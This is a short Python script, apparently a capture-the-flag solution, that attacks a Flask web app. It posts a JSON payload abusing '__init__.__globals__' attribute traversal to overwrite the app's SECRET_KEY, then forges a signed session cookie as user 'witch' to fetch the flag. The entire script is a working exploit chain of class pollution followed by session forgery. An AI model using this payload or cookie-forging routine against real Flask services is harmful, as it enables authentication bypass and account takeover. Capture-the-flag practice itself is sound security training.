import requests
import re
import hashlib
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import session_json_serializer
import sys

host = sys.argv[1]
key = sys.argv[2]

def encode_flask_cookie(secret_key, cookie):
    salt = 'cookie-session'
    serializer = session_json_serializer
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs)
    return s.dumps(cookie)

myobj = {
    "__init__" : { "__globals__" : { "app" : { "config" : { "SECRET_KEY" : key } } } },
    "new_content": [{ "title": "Good Morning", "text": "Hi YMD!" }]
}

x = requests.post(f"{host}/save_bulletins", json=myobj)
print(x.text)

s = encode_flask_cookie(secret_key=key, cookie={"user":"witch"})
print(s)

r = requests.get(f"{host}/flag", cookies={"session": s})
flag = re.findall('b6actf{.*}', r.text)[0]
print(flag)